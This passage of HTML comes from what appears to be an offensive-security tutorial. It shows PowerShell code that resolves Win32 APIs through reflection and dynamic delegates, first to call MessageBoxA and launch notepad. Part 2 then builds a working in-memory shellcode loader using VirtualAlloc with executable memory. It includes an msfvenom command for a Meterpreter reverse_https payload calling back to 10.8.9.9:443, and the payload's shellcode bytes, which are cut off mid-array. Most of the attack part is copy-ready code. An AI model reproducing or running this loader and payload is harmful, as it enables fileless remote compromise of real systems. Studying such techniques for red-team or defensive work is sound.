</span><span class="c"># Third arg - return type of the function, which for example 'MessageBoxA' is int.</span><span class="w">
</span><span class="c"># Fourth - array of argument types for the function we would like to call.</span><span class="w">

</span><span class="c"># 5. Define the Invoke method (actual function call)</span><span class="w">

</span><span class="nv">$MyMethodBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyTypeBuilder</span><span class="o">.</span><span class="nf">DefineMethod</span><span class="p">(</span><span class="s1">'Invoke'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Public, HideBySig, NewSlot, Virtual'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">],</span><span class="w"> </span><span class="p">@([</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">]))</span><span class="w">

</span><span class="c"># Just as with constructor, we must set the implementation flags to allow the Invoke method to be called.</span><span class="w">

</span><span class="nv">$MyMethodBuilder</span><span class="o">.</span><span class="nf">SetImplementationFlags</span><span class="p">(</span><span class="s1">'Runtime, Managed'</span><span class="p">)</span><span class="w">

</span><span class="c"># And finally, we create the delegate type object by instantiating $MyTypeBuilder.</span><span class="w">

</span><span class="c"># 6. Finalize the type</span><span class="w">

</span><span class="nv">$MyDelegateType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyTypeBuilder</span><span class="o">.</span><span class="nf">CreateType</span><span class="p">()</span><span class="w">


</span><span class="c"># We suply to $MyFunction the result of GetDelegateForFunctionPointer() function.</span><span class="w">

</span><span class="c"># 7. Connect our function pointer to the delegate</span><span class="w">

</span><span class="nv">$MyFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="w">
	</span><span class="nv">$MessageBoxA</span><span class="p">,</span><span class="w">
	</span><span class="nv">$MyDelegateType</span><span class="w">
</span><span class="p">)</span><span class="w">

</span><span class="c"># 8. Call MessageBoxA</span><span class="w">

</span><span class="nv">$MyFunction</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="s2">"Hello World"</span><span class="p">,</span><span class="w"> </span><span class="s2">"This is My MessageBox!"</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p><a href="https://i.imgur.com/8o5Fl6j.png" class="popup img-link shimmer"><img src="https://i.imgur.com/8o5Fl6j.png" alt="MessageBoxCreated" loading="lazy"></a></p>

<p>If you read carefully, you might notice that we never call the defined constructor.</p>

<p>We don’t explicitly call <code class="language-plaintext highlighter-rouge">MyConstructorBuilder</code> because it’s used internally by .NET when we create the delegate with <code class="language-plaintext highlighter-rouge">GetDelegateForFunctionPointer</code> - the constructor defines the delegate’s structure, and .NET automatically uses it when converting the function pointer to a managed delegate. The Invoke method is what we call directly, while the constructor works behind the scenes.</p>

<h3 id="bonus---invoking-winexec"><span class="me-2">Bonus - Invoking WinExec</span><a href="#bonus---invoking-winexec" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Using the same technique, we can launch applications. we we will create a child process by spawning instance of <code class="language-plaintext highlighter-rouge">notepad.exe</code> process.</p>

<p>As previously, we declare and use <code class="language-plaintext highlighter-rouge">LookupFunc</code> to identify the memory addresses. This time, for <code class="language-plaintext highlighter-rouge">WinExec</code> from <code class="language-plaintext highlighter-rouge">KERNEL32.dll</code>.</p>

<p>To find the proper data types we can use resources below:</p>

<ul>
  <li><a href="https://www.pinvoke.net/default.aspx/kernel32.winexec">https://www.pinvoke.net/default.aspx/kernel32.winexec</a></li>
  <li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec</a></li>
  <li><a href="https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre></td><td class="rouge-code"><pre><span class="kr">function</span><span class="w"> </span><span class="nf">LookupFunc</span><span class="w"> </span><span class="p">{</span><span class="w">

	</span><span class="kr">Param</span><span class="w"> </span><span class="p">(</span><span class="nv">$moduleName</span><span class="p">,</span><span class="w"> </span><span class="nv">$functionName</span><span class="p">)</span><span class="w">

	</span><span class="nv">$assem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain.GetAssemblies</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">GlobalAssemblyCache</span><span class="w"> </span><span class="o">-And</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Location</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">)[</span><span class="nt">-1</span><span class="p">]</span><span class="o">.</span><span class="nf">Equals</span><span class="p">(</span><span class="s1">'System.dll'</span><span class="p">)})</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'Microsoft.Win32.UnsafeNativeMethods'</span><span class="p">)</span><span class="w">
	</span><span class="nv">$tmp</span><span class="o">=</span><span class="p">@()</span><span class="w">
	</span><span class="nv">$assem</span><span class="o">.</span><span class="nf">GetMethods</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="kr">If</span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"GetProcAddress"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$tmp</span><span class="o">+=</span><span class="bp">$_</span><span class="p">}}</span><span class="w">
	
	</span><span class="kr">return</span><span class="w"> </span><span class="nv">$tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="p">@(</span><span class="err">(</span><span class="nv">$assem</span><span class="err">.GetMethod(</span><span class="s1">'GetModuleHandle'</span><span class="p">))</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="p">@(</span><span class="nv">$moduleName</span><span class="p">)),</span><span class="w"> </span><span class="nv">$functionName</span><span class="p">))</span><span class="w">
	</span><span class="p">}</span><span class="w">

</span><span class="nv">$WinExecFunc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LookupFunc</span><span class="w"> </span><span class="s2">"kernel32.dll"</span><span class="w"> </span><span class="s2">"WinExec"</span><span class="w"> </span><span class="c"># Saving resolved address to the variable</span><span class="w">


</span><span class="nv">$MyAssembly</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Reflection.AssemblyName</span><span class="p">(</span><span class="s1">'ReflectedDelegate'</span><span class="p">)</span><span class="w">

</span><span class="nv">$Domain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain</span><span class="w">

</span><span class="nv">$MyAssemblyBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Domain</span><span class="o">.</span><span class="nf">DefineDynamicAssembly</span><span class="p">(</span><span class="nv">$MyAssembly</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.Emit.AssemblyBuilderAccess</span><span class="p">]::</span><span class="nx">Run</span><span class="p">)</span><span class="w">

</span><span class="nv">$MyModuleBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyAssemblyBuilder</span><span class="o">.</span><span class="nf">DefineDynamicModule</span><span class="p">(</span><span class="s1">'InMemoryModule'</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">)</span><span class="w">

</span><span class="nv">$MyTypeBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyModuleBuilder</span><span class="o">.</span><span class="nf">DefineType</span><span class="p">(</span><span class="s1">'MyDelegateType'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Class, Public, Sealed, AnsiClass, AutoClass'</span><span class="p">,[</span><span class="n">System.MulticastDelegate</span><span class="p">])</span><span class="w">

</span><span class="nv">$MyConstructorBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyTypeBuilder</span><span class="o">.</span><span class="nf">DefineConstructor</span><span class="p">(</span><span class="w">

	</span><span class="s1">'RTSpecialName, HideBySig, Public'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.CallingConventions</span><span class="p">]::</span><span class="n">Standard</span><span class="p">,</span><span class="w"> </span><span class="p">@([</span><span class="n">String</span><span class="p">],[</span><span class="n">int</span><span class="p">])</span><span class="w"> </span><span class="c"># The third parameter - the arguments types of the WinExec function we would like to invoke.</span><span class="w">

</span><span class="p">)</span><span class="w">

</span><span class="nv">$MyConstructorBuilder</span><span class="o">.</span><span class="nf">SetImplementationFlags</span><span class="p">(</span><span class="s1">'Runtime, Managed'</span><span class="p">)</span><span class="w">

</span><span class="nv">$MyMethodBuilder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyTypeBuilder</span><span class="o">.</span><span class="nf">DefineMethod</span><span class="p">(</span><span class="s1">'Invoke'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Public, HideBySig, NewSlot, Virtual'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">int</span><span class="p">],</span><span class="w"> </span><span class="p">@([</span><span class="n">String</span><span class="p">],[</span><span class="n">int</span><span class="p">]))</span><span class="w"> </span><span class="c"># Fourth argumtnt - array of argument types for the WinExec function.</span><span class="w">

</span><span class="nv">$MyMethodBuilder</span><span class="o">.</span><span class="nf">SetImplementationFlags</span><span class="p">(</span><span class="s1">'Runtime, Managed'</span><span class="p">)</span><span class="w">

</span><span class="nv">$MyDelegateType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$MyTypeBuilder</span><span class="o">.</span><span class="nf">CreateType</span><span class="p">()</span><span class="w">

</span><span class="nv">$MyFunction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">(</span><span class="nv">$WinExecFunc</span><span class="p">,</span><span class="w"> </span><span class="nv">$MyDelegateType</span><span class="p">)</span><span class="w">

</span><span class="c"># Calling the WinExec function to create Notepad process.</span><span class="w">

</span><span class="nv">$MyFunction</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="s2">"notepad.exe"</span><span class="p">,</span><span class="w"> </span><span class="nx">5</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p><a href="https://i.imgur.com/S4QfCWz.png" class="popup img-link shimmer"><img src="https://i.imgur.com/S4QfCWz.png" alt="Notepad" loading="lazy"></a></p>

<p>Key Differences:</p>
<ul>
  <li>We use WinExec instead of MessageBoxA</li>
  <li>The delegate type matches WinExec’s simpler signature (just String and int parameters)</li>
  <li>The second parameter 5 makes the window visible (SW_SHOW)</li>
</ul>

<hr />

<h2 id="part-2---loading-shellcode"><span class="me-2">Part 2 - Loading shellcode</span><a href="#part-2---loading-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Since we need to call three different Win32 APIs (<code class="language-plaintext highlighter-rouge">VirtualAlloc</code>, <code class="language-plaintext highlighter-rouge">CreateThread</code> and <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code>), we’ll rewrite the portion of code that creates the delegate type into a function so that we can call it multiple times.
The resulting function is going to be <code class="language-plaintext highlighter-rouge">getDelegateType</code>. It should accept two arguments: <strong>the function arguments</strong> we would like to call gives as an array and it’s <strong>return type</strong>.</p>

<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="kr">function</span><span class="w"> </span><span class="nf">getDelegateType</span><span class="w"> </span><span class="p">{</span><span class="w">

    </span><span class="kr">Param</span><span class="w"> </span><span class="p">(</span><span class="w">
        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Position</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$True</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="n">Type</span><span class="w"> </span><span class="p">[]]</span><span class="w"> </span><span class="nv">$func</span><span class="p">,</span><span class="w"> </span><span class="c"># Array of function arguments</span><span class="w">
        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Position</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="n">Type</span><span class="p">]</span><span class="w"> </span><span class="nv">$delType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Void</span><span class="p">]</span><span class="w"> </span><span class="c"># Data type of return value</span><span class="w">
    </span><span class="p">)</span><span class="w">

    </span><span class="nv">$type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain.DefineDynamicAssembly</span><span class="p">((</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Reflection.AssemblyName</span><span class="p">(</span><span class="s1">'ReflectedDelegate'</span><span class="p">)),</span><span class="w">
    </span><span class="p">[</span><span class="n">System.Reflection.Emit.AssemblyBuilderAccess</span><span class="p">]::</span><span class="n">Run</span><span class="p">)</span><span class="o">.</span><span class="nf">DefineDynamicModule</span><span class="p">(</span><span class="s1">'InMemoryModule'</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">)</span><span class="o">.</span><span class="nf">DefineType</span><span class="p">(</span><span class="s1">'MyDelegateType'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Class, Public, Sealed, SnsiClass'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.MulticastDelegate</span><span class="p">])</span><span class="w">

    </span><span class="nv">$type</span><span class="o">.</span><span class="nf">DefineConstructor</span><span class="p">(</span><span class="s1">'RTSpecialName, HideBySig, Public'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.CallingConventions</span><span class="p">]::</span><span class="nx">Standard</span><span class="p">,</span><span class="w"> </span><span class="nv">$func</span><span class="p">)</span><span class="o">.</span><span class="nf">SetImplementationFlags</span><span class="p">(</span><span class="s1">'Runtime, Managed'</span><span class="p">)</span><span class="w">

    </span><span class="nv">$type</span><span class="o">.</span><span class="nf">DefineMethod</span><span class="p">(</span><span class="s1">'Invoke'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Public, HideBySig, NewSlot, Virtual'</span><span class="p">,</span><span class="w"> </span><span class="nv">$delType</span><span class="p">,</span><span class="w"> </span><span class="nv">$func</span><span class="p">)</span><span class="o">.</span><span class="nf">SetImplementationFlags</span><span class="p">(</span><span class="s1">'Runtime, Managed'</span><span class="p">)</span><span class="w">

    </span><span class="nx">return</span><span class="w"> </span><span class="nv">$type</span><span class="o">.</span><span class="nf">CreateType</span><span class="p">()</span><span class="w">

</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>The complete code to load our Meterpreter shellcode is shown below:</p>

<div class="language-powershell highlighter-rouge"><div class="code-header">
        <span data-label-text="Powershell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre></td><td class="rouge-code"><pre><span class="kr">function</span><span class="w"> </span><span class="nf">LookupFunc</span><span class="w"> </span><span class="p">{</span><span class="w">
	</span><span class="kr">Param</span><span class="w"> </span><span class="p">(</span><span class="nv">$moduleName</span><span class="p">,</span><span class="w"> </span><span class="nv">$functionName</span><span class="p">)</span><span class="w">
	</span><span class="nv">$assem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain.GetAssemblies</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">GlobalAssemblyCache</span><span class="w"> </span><span class="o">-And</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">Location</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s1">'\\'</span><span class="p">)[</span><span class="nt">-1</span><span class="p">]</span><span class="o">.</span><span class="nf">Equals</span><span class="p">(</span><span class="s1">'System.dll'</span><span class="p">)})</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'Microsoft.Win32.UnsafeNativeMethods'</span><span class="p">)</span><span class="w">
	</span><span class="nv">$tmp</span><span class="o">=</span><span class="p">@()</span><span class="w">
	</span><span class="nv">$assem</span><span class="o">.</span><span class="nf">GetMethods</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="kr">If</span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"GetProcAddress"</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="nv">$tmp</span><span class="o">+=</span><span class="bp">$_</span><span class="p">}}</span><span class="w">
	</span><span class="kr">return</span><span class="w"> </span><span class="nv">$tmp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="p">@(</span><span class="err">(</span><span class="nv">$assem</span><span class="err">.GetMethod(</span><span class="s1">'GetModuleHandle'</span><span class="p">))</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="p">@(</span><span class="nv">$moduleName</span><span class="p">)),</span><span class="w"> </span><span class="nv">$functionName</span><span class="p">))</span><span class="w">
	</span><span class="p">}</span><span class="w">

</span><span class="kr">function</span><span class="w"> </span><span class="nf">getDelegateType</span><span class="w"> </span><span class="p">{</span><span class="w">

    </span><span class="kr">Param</span><span class="w"> </span><span class="p">(</span><span class="w">
        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Position</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">Mandatory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$True</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="n">Type</span><span class="w"> </span><span class="p">[]]</span><span class="w"> </span><span class="nv">$func</span><span class="p">,</span><span class="w"> </span><span class="c"># Array of function arguments</span><span class="w">
        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Position</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="n">Type</span><span class="p">]</span><span class="w"> </span><span class="nv">$delType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Void</span><span class="p">]</span><span class="w"> </span><span class="c"># Data type of return value</span><span class="w">
    </span><span class="p">)</span><span class="w">

    </span><span class="nv">$type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">AppDomain</span><span class="p">]::</span><span class="n">CurrentDomain.DefineDynamicAssembly</span><span class="p">((</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Reflection.AssemblyName</span><span class="p">(</span><span class="s1">'ReflectedDelegate'</span><span class="p">)),</span><span class="w">
    </span><span class="p">[</span><span class="n">System.Reflection.Emit.AssemblyBuilderAccess</span><span class="p">]::</span><span class="n">Run</span><span class="p">)</span><span class="o">.</span><span class="nf">DefineDynamicModule</span><span class="p">(</span><span class="s1">'InMemoryModule'</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">)</span><span class="o">.</span><span class="nf">DefineType</span><span class="p">(</span><span class="s1">'MyDelegateType'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Class, Public, Sealed, AnsiClass, AutoClass'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.MulticastDelegate</span><span class="p">])</span><span class="w">

    </span><span class="nv">$type</span><span class="o">.</span><span class="nf">DefineConstructor</span><span class="p">(</span><span class="s1">'RTSpecialName, HideBySig, Public'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.Reflection.CallingConventions</span><span class="p">]::</span><span class="nx">Standard</span><span class="p">,</span><span class="w"> </span><span class="nv">$func</span><span class="p">)</span><span class="o">.</span><span class="nf">SetImplementationFlags</span><span class="p">(</span><span class="s1">'Runtime, Managed'</span><span class="p">)</span><span class="w">
    
    </span><span class="nv">$type</span><span class="o">.</span><span class="nf">DefineMethod</span><span class="p">(</span><span class="s1">'Invoke'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Public, HideBySig, NewSlot, Virtual'</span><span class="p">,</span><span class="w"> </span><span class="nv">$delType</span><span class="p">,</span><span class="w"> </span><span class="nv">$func</span><span class="p">)</span><span class="o">.</span><span class="nf">SetImplementationFlags</span><span class="p">(</span><span class="s1">'Runtime, Managed'</span><span class="p">)</span><span class="w">
    
    
    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$type</span><span class="o">.</span><span class="nf">CreateType</span><span class="p">()</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c"># Creating delegates for `VirtualAlloc`, `CreateThread` and `WaitForSingleObject`.</span><span class="w">

</span><span class="c"># https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc - Microsoft Docs</span><span class="w">
</span><span class="c"># https://www.pinvoke.net/default.aspx/kernel32.virtualalloc - PInvoke</span><span class="w">
</span><span class="c"># https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/</span><span class="w">

</span><span class="nv">$lpMem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="n">LookupFunc</span><span class="w"> </span><span class="nx">kernel32.dll</span><span class="w"> </span><span class="nx">VirtualAlloc</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="n">getDelegateType</span><span class="w"> </span><span class="p">@([</span><span class="n">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="n">UInt32</span><span class="p">])</span><span class="w"> </span><span class="p">([</span><span class="n">IntPtr</span><span class="p">])))</span><span class="o">.</span><span class="nf">Invoke</span><span class="p">([</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="nx">0x1000</span><span class="p">,</span><span class="w"> </span><span class="nx">0x3000</span><span class="p">,</span><span class="w"> </span><span class="nx">0x40</span><span class="p">)</span><span class="w">

</span><span class="c"># Meterpreter shellcode</span><span class="w">

</span><span class="c"># msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.8.9.9 LPORT=443 EXITFUNC=thread -f ps1</span><span class="w">

</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">xfc</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xe4</span><span class="p">,</span><span class="nx">0xf0</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0xcc</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x50</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x56</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xd2</span><span class="p">,</span><span class="nx">0x65</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x60</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x72</span><span class="p">,</span><span class="nx">0x50</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0xf</span><span class="p">,</span><span class="nx">0xb7</span><span class="p">,</span><span class="nx">0x4a</span><span class="p">,</span><span class="nx">0x4a</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0xac</span><span class="p">,</span><span class="nx">0x3c</span><span class="p">,</span><span class="nx">0x61</span><span class="p">,</span><span class="nx">0x7c</span><span class="p">,</span><span class="nx">0x2</span><span class="p">,</span><span class="nx">0x2c</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0xd</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0xe2</span><span class="p">,</span><span class="nx">0xed</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x42</span><span class="p">,</span><span class="nx">0x3c</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x78</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0xb</span><span class="p">,</span><span class="nx">0x2</span><span class="p">,</span><span class="nx">0xf</span><span class="p">,</span><span class="nx">0x85</span><span class="p">,</span><span class="nx">0x72</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x80</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x85</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0x74</span><span class="p">,</span><span class="nx">0x67</span><span class="p">,</span><span 